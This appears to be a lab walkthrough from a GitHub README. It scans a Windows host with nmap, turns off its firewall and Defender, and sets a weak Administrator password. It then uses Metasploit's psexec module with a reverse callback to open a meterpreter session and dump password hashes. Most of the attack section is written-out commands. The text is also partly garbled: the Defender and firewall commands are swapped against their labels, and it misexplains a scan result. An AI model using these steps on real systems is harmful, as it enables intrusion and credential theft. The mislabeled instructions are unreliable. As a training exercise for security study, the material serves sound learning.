# Host-Firewalls-and-Nmap

![Image 11-13-24 at 11 34 AM](https://github.com/user-attachments/assets/4398ee24-1416-442c-bc53-ebf2e26030aa)
First we start off with in Windows computer to find the IP address
Click the Command Prompt and type in <pre>ipconfig</pre>

Once in Linux
![Image 11-13-24 at 11 30 AM](https://github.com/user-attachments/assets/4056affa-1bf6-4031-abeb-73c77cde875a)
Become a root user by using <pre>sudo su -</pre>

![Image 11-13-24 at 11 34 AM](https://github.com/user-attachments/assets/0f14b49a-ab4b-4b1b-b86b-edcab3013fe6)
In Linux put the comand: <pre>nmap (IP address you got from the command prompt)</pre>
You should be able to see which ports are opened 

In the Windows command prompt let's enable the Windows firewall
![Image 11-13-24 at 11 36 AM](https://github.com/user-attachments/assets/0eb69157-ebcb-45bf-a4fe-ee08b36d0866)
<pre>netsh advfirewall set allprofiles state on</pre>

Now rescan the ports in Linux
![Image 11-13-24 at 11 39 AM](https://github.com/user-attachments/assets/2b71fa92-da28-4e4b-a920-77cba29c7175)
<pre>nmap 10.10.123.169</pre>
Notice how the scan looks the same because the firewall is enabled

![Image 11-13-24 at 11 55 AM](https://github.com/user-attachments/assets/a3f09c94-f903-4dde-9cd1-78d2d719c89c)
In PowerShell, let's disable the firewall by typing: <pre>`Set-MpPreference -DisableRealtimeMonitoring $true`</pre>
In PowerShell, let's disable Antivirus <pre>netsh advfirewall set allprofiles state off</pre> into PowerShell
Use an easy password such as password1234
In PoweerShell, type in <pre>ipconfig</pre> to check the IP address

Back to Kali Linux type in <pre>msfconsole -q</pre> ![Image 11-13-24 at 12 02 PM](https://github.com/user-attachments/assets/c46aceda-feae-47a3-82de-730b1b4223d4)
In another Kali terminal you need to get the IP address of the Linux machine
Type <pre>ifconfig</pre> into the terminal

Once you have the IP address of the Linux machine got back to the first terminal
![Image 11-13-24 at 12 02 PM](https://github.com/user-attachments/assets/180e4027-b07b-4701-8412-db532cb9f08d)
msf6 > `use exploit/windows/smb/psexec`


msf6 exploit(windows/smb/psexec) > `set RHOST 10.10.123.169`

msf6 exploit(windows/smb/psexec) > `set LHOST 10.10.94.202`


msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`

msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234` 

msf6 exploit(windows/smb/psexec) > `exploit`

Now we need to dump the password hashes:
meterpreter > `hashdump`
![Image 11-13-24 at 12 07 PM](https://github.com/user-attachments/assets/15c92ba5-f65a-44ad-88ca-e280fa876b49)
Here you should see a bunch of password hashes
To kill it
meterpreter > `exit -y`

Once done repeat the steps in PowerShell to re-enable your firewall
PS C:\Users\Administrator> `netsh advfirewall set allprofiles state on`




